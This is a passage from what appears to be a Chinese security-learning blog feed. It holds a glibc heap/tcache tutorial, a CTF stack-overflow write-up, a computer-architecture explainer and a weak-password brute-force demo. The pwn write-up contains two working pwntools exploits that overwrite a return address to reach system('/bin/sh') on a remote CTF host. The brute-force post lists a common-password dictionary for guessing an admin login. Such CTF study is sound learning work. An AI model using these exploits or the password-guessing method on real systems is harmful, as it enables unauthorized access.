在讲完free相关的知识点后，我们应该清楚了，在free我们申请的动态内存后，系统并不会及时的收回，而是将空闲的chunk放入对应的链表结构中，等下次再申请相同大小的内存空间时，就无需再进行系统分配，而是直接将空闲的chunk返回，这样就极大的提高了堆的工作效率，下面我们通过一个示例代码来说明这一点，不过要说明的是，因为我的链接库是用的lib-2.30，如下图：</p><p><img src="/images/136-16.png" alt></p><center><font size="2">图16</font></center><p>所以在分配chunk时采用了tcache机制，关于这个机制我就不在展开，只需要知道<code>当一个Tcache链表装满了7个，再有对应的chunk被free，就会被放到相应的链表结构中</code>，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *c,*a,*b,*d,*e,*f,*g,*h,*i,*j;</span><br><span class="line">    <span class="keyword">char</span> *o;</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 1</span></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 2</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 3 </span></span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 4</span></span><br><span class="line">e = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 5</span></span><br><span class="line">f = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 6</span></span><br><span class="line">g = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 7</span></span><br><span class="line">h = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 8</span></span><br><span class="line">i = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 9</span></span><br><span class="line">j = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 10</span></span><br><span class="line">o = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 11</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"><span class="built_in">free</span>(e);</span><br><span class="line"><span class="built_in">free</span>(f);</span><br><span class="line"><span class="built_in">free</span>(g);</span><br><span class="line"><span class="built_in">free</span>(h);</span><br><span class="line"><span class="built_in">free</span>(i);</span><br><span class="line"><span class="built_in">free</span>(j);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在示例代码中，我们一共申请了11个300B大小的chunk，释放了10个chunk，按理说释放的前7个chunk被放到了Tcache中，因为是300B，所以后面三个会被放到Unsorted bin中，下面来验证我们的猜测，结果如下图：</p></blockquote><p><img src="/images/136-17.png" alt></p><center><font size="2">图17</font></center><blockquote><p>有的同学可能会对上图产生疑问：<code>Unsorted bin明明只有1个chunk块，不是应该有3个吗？</code>是的，的确是一个chunk块，但是大家看一下该块的size是0x3c0，那么就是<code>0x140+0x140+0x140</code>的结果，可以看出，本来三个chunk被合并了1个chunk，这里面涉及了<code>Unlink</code>机制，限于本篇篇幅，这个知识点就不在这展开了，有兴趣的同学可以自行学习，我在后期也可能单独拿出来介绍，因为这个知识点在漏洞利用时还挺重要。</p><p>还记得前面学习到的prev_inuse位吗？在上面的Unsorted bin中我们就可以感受到该标志位，如下图：</p></blockquote><p><img src="/images/136-18.png" alt></p><center><font size="2">图18</font></center><blockquote><p>如果标志位是1的话，那么size的大小应该为0x141，所以在这里标志位置为0了。<font color="red"><strong>注意：一定要明白只有在双链表结构中，并且发生Unlink时，标志位才会发生改变</strong>。</font></p></blockquote><h3 id="font-color-navy0x05-总结font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-总结font"></a> <font color="navy"><code>0x05 总结</code></font></h3><p>      有关堆的入门很难，因为我的知识有限，所以只能先帮助大家了解到这里了，而且也不能保证本文没有错误，所以还希望有兴趣的同学可以自己再去看看其他的资料，自己多动手操作一下，以帮助自己的理解，谢谢！</p><h3 id="font-color-navy0x05-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x05-referencefont"></a> <font color="navy"><code>0x05 Reference</code></font></h3><p>[1] <a href="https://zhuanlan.zhihu.com/p/24753861?utm_source=wechat_session&amp;utm_medium=social&amp;utm_oi=843456231229227008" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a></p><p>[2] <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_state" target="_blank" rel="noopener">Browse the source code of glibc/malloc/malloc.c</a></p><p>[3] <a href="http://abcdxyzk.github.io/blog/2015/08/05/kernel-mm-malloc/" target="_blank" rel="noopener">进程分配内存的两种方式–brk() 和mmap()（不设计共享内存）</a></p><p>[4] <a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="noopener">Syscalls used by malloc.</a></p><p>[5] <a href="https://stackoverflow.com/questions/30542428/does-malloc-use-brk-or-mmap" target="_blank" rel="noopener">Does malloc() use brk() or mmap()?</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>CTF-misc类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/12/2020.07.12%EF%BC%88135%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/12/2020.07.12（135）/</id>
    <published>2020-07-11T16:00:00.000Z</published>
    <updated>2020-07-25T03:10:50.828Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d4808b5bdac6aecdfac0c4ee04e40320e3d7d62044026298eab971ba5854aa80"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【看雪CTF-pwn】一鸣惊人的栈溢出</title>
    <link href="https://muzibing.github.io/2020/07/04/2020.07.04%EF%BC%88134%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/04/2020.07.04（134）/</id>
    <published>2020-07-03T16:00:00.000Z</published>
    <updated>2020-07-04T14:37:00.456Z</updated>
    
    <content type="html"><![CDATA[<p>      这道题目真的太坑了，不过也给我提了一个醒，就是<code>在做题时不能对IDA pro反编译的伪代码过于相信</code>，在感觉有问题的地方，一定自己用<code>GDB</code>调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将用两种姿势来获取flag。</p><h3 id="font-color-navy0x00-准备工作font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-准备工作font"></a> <font color="navy"><code>0x00 准备工作</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file ymjr </span><br><span class="line"></span><br><span class="line">ymjr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以看出该文件是32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># checksec ymjr </span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/Kanxue/1/pwn/YMJR/ymjr&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>该ELF文件只开启了栈不可执行保护</p></blockquote><p><img src="/images/134-1.png" alt></p><blockquote><p>从上图的IDA中可以看出，gets()函数中的变量<code>v4</code>在栈中被分配的空间为<code>0x64</code>，但是在后面的exp.py文件中构造成功了，但是没有成功得到flag，于是我去gdb中调试了一下，如下图：</p></blockquote><p><img src="/images/134-2.png" alt></p><blockquote><p>从上图中可以看出，v4距<code>esp</code>的距离有<code>0x1c</code>，esp中的地址为<code>0xffffd860</code>，那么v4的地址为<code>0xffffd87c</code>。这个时候ebp中地址为<code>0xffffd8e8</code>，那么<code>v4</code>与<code>ebp</code>的距离为<code>0xffffd8e8-0xffffd87c=108（0x6c）</code>，示意图如下：</p></blockquote><p><img src="/images/134-3.png" alt></p><h3 id="font-color-navy0x01-姿势一font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-姿势一font"></a> <font color="navy"><code>0x01 姿势一</code></font></h3><blockquote><p>直接让返回地址跳转到<code>system(&quot;/bin/sh&quot;)</code>处</p></blockquote><p>     我们先看看程序中有没有可以直接利用的shell，在IDA中查找一下，发现在secure()函数中发现了<code>system(&quot;/bin/sh&quot;)</code>，如下图：</p><p><img src="/images/134-4.png" alt></p><p>      那么我们是否可以将main函数的返回地址填充为<code>system(&quot;/bin/sh&quot;)</code>函数的地址呢？下面我们来进行尝试我们开始写exp，不过请放心，我会详细的介绍每一步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">shell_addr = <span class="number">0x804863A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(shell_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>执行结果如下：</p></blockquote><p><img src="/images/134-5.png" alt></p><h3 id="font-color-navy0x02-姿势二font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-姿势二font"></a> <font color="navy"><code>0x02 姿势二</code></font></h3><p>      第二种姿势和第一种差不多，只不过是自己构造shell，需要我们自己查找字符串<code>/bin/sh</code>的地址，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary ymjr --string &quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048763 : /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ymjr"</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x08048763</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(system_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># system函数的返回地址，我们并不管执行system函数以后的返回地址</span></span><br><span class="line">payload += p32(bin_sh_addr)<span class="comment"># system函数的参数/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;      这道题目真的太坑了，不过也给我提了一个醒，就是&lt;code&gt;在做题时不能对IDA pro反编译的伪代码过于相信&lt;/code&gt;，在感觉有问题的地方，一定自己用&lt;code&gt;GDB&lt;/code&gt;调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="看雪CTF" scheme="https://muzibing.github.io/tags/%E7%9C%8B%E9%9B%AACTF/"/>
    
  </entry>
  
  <entry>
    <title>【科普】冯·诺依曼结构与具体实现</title>
    <link href="https://muzibing.github.io/2020/07/03/2020.07.03%EF%BC%88133%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/03/2020.07.03（133）/</id>
    <published>2020-07-02T16:00:00.000Z</published>
    <updated>2020-07-03T07:24:55.662Z</updated>
    
    <content type="html"><![CDATA[<h4 id="font-color-navy1冯诺依曼计算的主要构成font"><a class="markdownIt-Anchor" href="#font-color-navy1冯诺依曼计算的主要构成font"></a> <font color="navy">1.冯·诺依曼计算的主要构成</font></h4><p>      冯·诺依曼计算机主要是由五大部分构成：</p><ol><li>运算器（CA）：Central Arithmetical</li><li>控制器（CC）：Central Contral</li><li>存储器（M）：Memory</li><li>输入设备（I）：Input</li><li>输出设备（O）：Output</li></ol><p>      除了上述五部分，还有一个<code>外部记录介质 R</code>(outside Recording medium)，示意图如下：</p><p><img src="/images/133-1.png" alt></p><blockquote><p>下面我们就来看看和具体实现是如何对应的呢？</p></blockquote><h4 id="font-color-navy2冯诺依曼结构原理与实现的对应font"><a class="markdownIt-Anchor" href="#font-color-navy2冯诺依曼结构原理与实现的对应font"></a> <font color="navy">2.冯·诺依曼结构原理与实现的对应</font></h4><p><img src="/images/133-2.png" alt></p><p>      如上图，它们一一对应关系如下：</p><blockquote><ul><li>CPU ⇢ 运算器 CA和控制器 CC</li><li>主存 ⇢ 存储器 M</li><li>键盘 ⇢ 输入设备 I</li><li>硬盘、显示器 ⇢  输出设备</li></ul></blockquote><p>      在这里要说明的是主板上的<code>北桥</code>、<code>南桥</code>和<code>BIOS</code>三个部件</p><p><code>北桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在主板上，CPU是如何获取指令并去执行的呢？上图的主板上采取了南北桥结构，CPU对外会连接一块芯片北桥，CPU想要访问主存，就必须通过北桥芯片。</span><br></pre></td></tr></table></figure><p><code>南桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在北桥下方有一块芯片，叫做南桥，南桥内部集成了很多输入输出设备的控制器，其中就包括硬盘的控制器，也就是说硬盘实际上就是和南桥相连的。</span><br></pre></td></tr></table></figure><p><code>BIOS</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要注意，计算机刚启动时，主存中是没有信息的，因为断电后主存的信息都会丢失，这是RAM的一个特性，那么系统启动以后，CPU从什么地方获取指令呢？</span><br><span class="line">是否是从硬盘中取得呢？不是的，因为从硬盘访问数据相对比较复杂，那么实际上在主板上还有一个很小的芯片，它与南桥相连，一般称之为BIOS（Base Input Output System）芯片，该芯片存储容量很小，会保存一段比较简单但是比较重要的程序，包括检查主板上都有哪些设备，并且检查这些设备是否工作正常，这个芯片实际上是一个只读存储器（ROM），当断电后BIOS芯片中的数据是不会丢失的，但是从冯·诺依曼结构上来看，它并不属于存储器的范畴，而是和硬盘一样属于外部记录介质R，所以当计算机启动后，CPU会一次通过北桥 -&gt; 南桥，访问到BIOS芯片，从中取得指令。</span><br><span class="line">CPU从BIOS芯片中取得指令后，会依次检查主板上的各个设备，包括是否有显卡，通过显卡连接显示器，检查键盘的存在</span><br></pre></td></tr></table></figure><p>      目前显卡的功能越来越复杂，性能也越来越强大，尤其是其中的图形处理单元（GPU），GPU往往也可以进行复杂的数学计算，拥有很强的运算能力，有时候也让GPU承担一些运算的工作，实际上在高性能的运算中会采用大量的GPU来进行运算，从这个意义上将GPU也承担了运算器和控制器的一些功能。而南北桥也在迅速的发生变化。</p><h4 id="font-color-navy3南北桥架构的演变font"><a class="markdownIt-Anchor" href="#font-color-navy3南北桥架构的演变font"></a> <font color="navy">3.南北桥架构的演变</font></h4><p><code>演变（1）</code></p><p><img src="/images/133-3.png" alt></p><p>      上图还是刚才的主板。我们先来看图中右侧部分，最上方是CPU，其中往往包含很多CPU核；向下CPU连接的是北桥，北桥中主要有主存控制器—对外连接主存，现在的显卡一般采用PCIe接口，所以在北桥中有一个PCIe控制器，对外通过PCIe插槽连接PCIe显卡，当然对显存的要求不高，可以通过北桥的集成显卡直接连接显示器；北桥还连接着南桥，南桥中集中了大多数I/O设备的控制器。</p><p>      下面再来看左侧部分，红色箭头部分表示传输压力很大，而绿色部分表示传输压力较小，在这种情况下，最主要解决对性能影响最大的关键问题，就是<code>CPU访问主存的通道</code>，所以在南北桥上发生的第一个变化如下。</p><p><code>演变（2）</code></p><p><img src="/images/133-4.png" alt></p><p>      如上图，在南北桥上发生的第一个变化，就是<strong>北桥的主控制器被移到了CPU芯片中</strong>，从图中可以看到，CPU卡槽离主存卡槽更近，这是因为现在CPU是直接访问主存的，而不需要再通过访问北桥了，这样大大提高了数据传输率，现在显示的通道就成为了要解决的下一个问题。</p><p><code>演变（3）</code></p><p><img src="/images/133-5.png" alt></p><p>     如上图，在最新的个人计算机的CPU设计中，不仅包含了主存控制器，还包含了PCIe控制器，在外部可以直接连接显卡，这样北桥的的重要部件都被集成到了CPU中，那么北桥就没有存在的必要了，于是将北桥剩余的一些功能整合到南桥中，那么所谓南北桥架构已经消失了，由于没有北桥，那么南桥的名字也显得奇怪了，所以往往有一些不同的名字，比如PCH等。这样就将大部分通过主板连接的线路，集成到了CPU内部，这样就大大的提升了系统的性能。</p><p><code>演变（4）</code></p><p><img src="/images/133-6.png" alt></p><p>      什么是系统芯片呢？系统芯片<code>就是将计算机或其他电子系统集成为单一芯片的集成电路</code>，这种芯片在智能手机、平板电脑等移动计算设备上得到了广泛应用。下面要提的是一个著名定理<code>摩尔定律</code></p><h4 id="font-color-navy4摩尔定律font"><a class="markdownIt-Anchor" href="#font-color-navy4摩尔定律font"></a> <font color="navy">4.摩尔定律</font></h4><p><code>摩尔定律原型</code></p><p>      1965年，摩尔在《电子学》杂志上预测：<code>在最低元件价格下，集成电路的复杂度每年大约增加一倍，这一增长率至少可以维持十年</code>。这就是摩尔定律的原型。但是于1967年，摩尔调整了预测，<code>在最低元件价格下，集成电路的复杂度每两年增加一倍，这一增长率至少可以维持十年</code>。</p><p><code>现在摩尔定律的描述</code></p><p>      现在摩尔定律常被描述为：<code>当价格不变时，集成电路上可容纳的晶体管数目，约每隔18个月便会增加一倍，性能也将提升一倍</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;1.冯·诺依
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【web安全】爆破用户登录弱口令</title>
    <link href="https://muzibing.github.io/2020/07/01/2020.07.01%EF%BC%88132%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/01/2020.07.01（132）/</id>
    <published>2020-06-30T16:00:00.000Z</published>
    <updated>2020-07-01T08:04:31.897Z</updated>
    
    <content type="html"><![CDATA[<p>     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如<code>123456789</code>、<code>88888888</code>等，大家也许知道这样的密码是不安全的，但是并不清楚为什么不安全。今天我就带着大家的疑问，来和大家讲一下<font color="navy"><code>弱口令</code></font>为什么不安全的。</p><p><code>情景假设</code></p><blockquote><p>加入小明自己写了一个登陆系统，如下图，他在设置管理员密码时，随便输入一串字符串。这里我们并不知道这个密码是多少，下面看一下我们是否能登录该系统。</p></blockquote><p><img src="/images/132-1.png" alt></p><h4 id="font-color-navy1创建字典font"><a class="markdownIt-Anchor" href="#font-color-navy1创建字典font"></a> <font color="navy">1.创建字典</font></h4><p>     情境中给出了说明：随便输了一串字符串。那我们先假设这段字符串很简单，我们根据人们常用的密码创建一个密码字典，以备我们后面使用，字典部分内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">123456789</span><br><span class="line">a123456</span><br><span class="line">123456</span><br><span class="line">a123456789</span><br><span class="line">1234567890</span><br><span class="line">woaini1314</span><br><span class="line">qq123456</span><br><span class="line">abc123456</span><br><span class="line">123456a</span><br><span class="line">123456789a</span><br><span class="line">147258369</span><br><span class="line">zxcvbnm</span><br><span class="line">987654321</span><br><span class="line">12345678910</span><br><span class="line">abc123</span><br><span class="line">qq123456789</span><br><span class="line">123456789.</span><br><span class="line">7708801314520</span><br><span class="line">woaini</span><br><span class="line">5201314520</span><br><span class="line">q123456</span><br><span class="line">123456abc</span><br><span class="line">1233211234567</span><br><span class="line">123123123</span><br><span class="line">123456.</span><br><span class="line">0123456789</span><br><span class="line">asd123456</span><br><span class="line">aa123456</span><br><span class="line">135792468</span><br><span class="line">q123456789</span><br><span class="line">abcd123456</span><br><span class="line">12345678900</span><br><span class="line">woaini520</span><br><span class="line">woaini123</span><br><span class="line">zxcvbnm123</span><br><span class="line">1111111111111111</span><br><span class="line">w123456</span><br><span class="line">aini1314</span><br><span class="line">abc123456789</span><br><span class="line">111111</span><br><span class="line">woaini521</span><br><span class="line">qwertyuiop</span><br><span class="line">1314520520</span><br><span class="line">1234567891</span><br><span class="line">qwe123456</span><br><span class="line">asd123</span><br><span class="line">000000</span><br><span class="line">1472583690</span><br><span class="line">1357924680</span><br><span class="line">789456123</span><br><span class="line">123456789abc</span><br><span class="line">z123456</span><br><span class="line">1234567899</span><br></pre></td></tr></table></figure><h4 id="font-color-navy2爆破密码font"><a class="markdownIt-Anchor" href="#font-color-navy2爆破密码font"></a> <font color="navy">2.爆破密码</font></h4><p>      在这里我们要用到一个抓包工具<code>Burp Suit</code>（666666），它长下面这个样子：</p><p><img src="/images/132-2.png" alt></p><p>      下面我用动图R的形式来展示一下爆破的整个过程：</p><p><img src="/images/132-3.gif" alt></p><blockquote><p>可以从上图中看出，管理员密码为<code>123456</code>，所以说通过这个简单的例子可以看出，我们平常在设置密码时尽量不要用弱口令，尽量使用字母、数字和符号的混合字符串，以保证我们账户的安全性。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如&lt;code&gt;123456789&lt;/cod
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>【C语言学习系列二】 C语言中的基本数据类型</title>
    <link href="https://muzibing.github.io/2020/06/26/2020.06.24%EF%BC%88131%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/26/2020.06.24（131）/</id>
    <published>2020-06-25T16:00:00.000Z</published>
    <updated>2020-06-26T11:00:38.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基本数据类型font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基本数据类型font"></a> <font color="navy"><code>0x00 基本数据类型</code></font></h3><p><img src="/images/131-1.png" alt></p><table><thead><tr><th style="text-align:center"><font size="2">基本类型</font></th><th style="text-align:center"><font size="2">字节</font></th><th style="text-align:center"><font size="2">范围</font></th></tr></thead><tbody><tr><td style="text-align:center"><font size="2">char</font></td><td style="text-align:center"><font size="2">1byte</font></td><td style="text-align:center"><font size="2">—</font></td></tr><tr><td style="text-align:center"><font color="navy" size="2">short</font></td><td style="text-align:center"><font size="2">2bytes</font></td><td style="text-align:center"><font size="2">0~32767(0~0x7fff)<br>-32768~-1(0x8000~0xffff)</font></td></tr><tr><td style="text-align:center"><font size="2">int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~2147483647(0~0x7fffffff)<br>-2147483648~-1(0x80000000~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~4294967295(0~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">正: 0~0x7fffffffffffffff<br>负: 0x8000000000000000~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">0~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">float</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">|3.4e-38|~|3.4e+38|</font></td></tr><tr><td style="text-align:center"><font size="2">double</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td 